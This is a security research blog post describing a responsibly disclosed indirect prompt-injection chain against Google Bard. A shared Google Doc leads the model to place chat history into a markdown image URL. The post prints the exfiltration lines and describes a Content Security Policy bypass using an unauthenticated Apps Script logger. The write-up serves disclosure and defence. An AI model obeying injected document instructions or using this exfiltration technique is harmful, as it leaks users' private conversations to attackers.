    <h1>Hacking Google Bard – From Prompt Injection to Data Exfiltration</h1>
    
    <div id="readability-page-1" class="page"><section>
    <p>Recently Google Bard got some <a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">powerful updates</a>, including Extensions. Extensions allow Bard to access YouTube, search for flights and hotels, and also to access a user’s personal documents and emails.</p>
<p><strong>So, Bard can now access and analyze your Drive, Docs and Gmail!</strong></p>
<p>This means that it analyzes untrusted data and will be susceptible to Indirect Prompt Injection.</p>
<p>I was able to quickly validate that Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with <code>Google Docs</code>.</p>
<p>Turns out that it followed the instructions:</p>
<p><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845"><img src="https://thewitchofendor.com/blog/images/2023/google-bard-pi.png" alt="Google Bard Prompt Injection Demo"/></a></p>
<p>At that point it was clear that things will become a lot more interesting.</p>
<p>A shout out to <a href="https://twitter.com/rez0__">Joseph Thacker</a> and <a href="https://twitter.com/KGreshake">Kai Greshake</a> for brainstorming and collaborating on this together.</p>
<h2 id="whats-next">What’s next?</h2>
<p>Indirect Prompt Injection attacks via Emails or Google Docs are interesting threats, because these can be delivered to users without their consent.</p>
<p><strong>Imagine an attacker force-sharing Google Docs with victims!</strong></p>
<p>When the victim searches or interacts with the attacker’s document using Bard the prompt injection can kick in!</p>
<p><strong>Scary stuff!</strong></p>
<p>A common vulnerability in LLM apps is chat history exfiltration via rendering of hyperlinks and images. The question was, how might this apply to Google Bard?</p>
<h2 id="the-vulnerability---image-markdown-injection">The Vulnerability - Image Markdown Injection</h2>
<p>When Google’s LLM returns text it can return markdown elements, which Bard will render as HTML! This includes the capability to render images.</p>
<p>Imagine the LLM returns the following text:</p>
<pre tabindex="0"><code>![Data Exfiltration in Progress](https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION])
</code></pre><p>This will be rendered as an HTML image tag with a <code>src</code> attribute pointing to the <code>attacker</code> server.</p>
<pre tabindex="0"><code>&lt;img src=&#34;https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]&#34;&gt;
</code></pre><p>The browser will automatically connect to the URL without user interaction to load the image.</p>
<p>Using the power of the LLM we can summarize or access previous data in the chat context and append it accordingly to the URL.</p>
<p><a href="https://thewitchofendor.com/blog/images/2023/bard-exfil-logo.png"><img src="https://thewitchofendor.com/blog/images/2023/bard-exfil-logo.png" alt="Google Bard Data Exfil"/></a></p>
<p>When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it.</p>
<p>However image rendering was blocked by Google’s Content Security Policy.</p>
<h2 id="content-security-policy-bypass">Content Security Policy Bypass</h2>
<p>To render images from an attacker controlled server there was an obstacle. Google has a Content Security Policy (CSP) that prevents loading images from arbitary locations.</p>
<p><a href="https://thewitchofendor.com/blog/images/2023/bard-csp2.png"><img src="https://thewitchofendor.com/blog/images/2023/bard-csp2.png" alt="CSP policy"/></a></p>
<p>The CSP contains locations such as <code>*.google.com</code> and <code>*.googleusercontent.com</code>, which seemed quite broad.</p>
<p><strong>It seemed that there should be a bypass!</strong></p>
<p>After some research I learned about <code>Google Apps Script</code>, that seemed most promising.</p>
<p><code>Apps Scripts</code> are like Office Macros. And they can be invoked via a URL and run on the <code>script.google.com</code> (respectiveley <code>googleusercontent.com</code>) domains!!</p>
<p><img src="https://thewitchofendor.com/blog/images/2023/google-bard-appscript.png" alt="appsscript bypass"/></p>
<p>So, this seemed like a winner!</p>
<h2 id="writing-the-bard-logger">Writing the Bard Logger</h2>
<p>Equipped with that knowledge a “Bard Logger” in <code>Apps Script</code> was implemented.</p>
<p>The logger writes all query parameters appended to the invocation URL to a <code>Google Doc</code>, which is the exfiltration destination.</p>
<p><a href="https://thewitchofendor.com/blog/images/2023/google-bard-logger.png"><img src="https://thewitchofendor.com/blog/images/2023/google-bard-logger.png" alt="Bard Logger"/></a></p>
<p>For a second it seemed like it’s not possible to expose such an endpoint anonymously, but after some clicking through the <code>Apps Script</code> UI I found a setting to make it have no authentication.</p>
<p>So, now all the pieces were ready:</p>
<ol>
<li>Google Bard is vulnerable to Indirect Prompt Injection via data from Extensions</li>
<li>There is vulnerabilty in Google Bard that allows rendering of images (zero click)</li>
<li>A malicious Google Doc Prompt Injection Instructions to exploit the vulnerability</li>
<li>A logging endpoint on <code>google.com</code> to receive the data when the image is loaded</li>
</ol>
<p>But, will it work?</p>
<h2 id="demo-and-responsible-disclosure">Demo and Responsible Disclosure</h2>
<p>A video tells more than a 1000 words, so check it out!</p>

<p>
  <iframe src="https://www.youtube.com/embed/CKAED_jRaxw" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<p>In the video you can see how the chat history of the user is exfiltrated once the malicious <code>Google Doc</code> is brought into the chat context.</p>
<p>If you prefer screenshots over video, look further below.</p>
<h2 id="show-me-the-shell-code">Show me the Shell Code</h2>
<p><strong>Shell Code is natural language these days.</strong></p>
<p>This is the <code>Google Doc</code> including the payload used to perform the prompt injection and data exfiltration:</p>
<p><a href="https://thewitchofendor.com/blog/images/2023/google-bard-payload.png"><img src="https://thewitchofendor.com/blog/images/2023/google-bard-payload.png" alt="Bard Renders Image"/></a></p>
<p>The exploit leverages the power of the LLM to replace the text inside the image URL, we give a few examples also to teach the LLM where to insert the data properly.</p>
<p>This was not needed with other Chatbots in the past, but Google Bard required some “in context learning” to complete the task.</p>
<h2 id="screenshots">Screenshots</h2>
<p>In case you don’t have time to watch the video, here are the key steps:</p>
<ul>
<li>
<p>First the user chats with Bard providing some text
<a href="https://thewitchofendor.com/blog/images/2023/bard-data-exfil-data.png"><img src="https://thewitchofendor.com/blog/images/2023/bard-data-exfil-data.png" alt="Bard Renders Image"/></a></p>
</li>
<li>
<p>User navigates to the Google Doc (The Bard2000), which leads to injection of the attacker instructions, and rendering of the image:
<a href="https://thewitchofendor.com/blog/images/2023/Bard-Exfil-Image-Markdown.png"><img src="https://thewitchofendor.com/blog/images/2023/Bard-Exfil-Image-Markdown-crop.png" alt="Bard Renders Image"/></a></p>
</li>
<li>
<p>The attacker receives the data via the Bard Logger Apps Script into a Google Doc:
<a href="https://thewitchofendor.com/blog/images/2023/Bard-Exfil-BardLogger-Results.png"><img src="https://thewitchofendor.com/blog/images/2023/Bard-Exfil-BardLogger-Results.png" alt="bard logger results"/></a></p>
</li>
<li>
<p><strong>That’s it. Mission accomplished.</strong></p>
</li>
</ul>
<p>This chain was a bit more complex as others we discussed previously (like Bing Chat, ChatGPT or Claude), because a bypass for the <code>CSP</code> had to be found.</p>
<h2 id="googles-fix">Google’s Fix</h2>
<p>The issue was reported to Google VRP on September, 19 2023. After an inquiry on October 19, 2023 to check on status, since I wanted to demo at <a href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023</a>, Google confirmed it’s fixed and gave green light for including the demo in the talk.</p>
<p>It’s not yet entirely clear what the fix was at the moment. The CSP was not modified, and images still render - so, it seems some filtering was put in place to prevent insertion of data into the URL. That will be something to explore next!</p>
<h2 id="conclusion">Conclusion</h2>
<p>This vulnerability shows the power and degrees of freedom an adversary has during an Indirect Prompt Injection attack.</p>
<p>Thanks to the Google Security and Bard teams for fixing this issue promptly.</p>
<p>Cheers.</p>
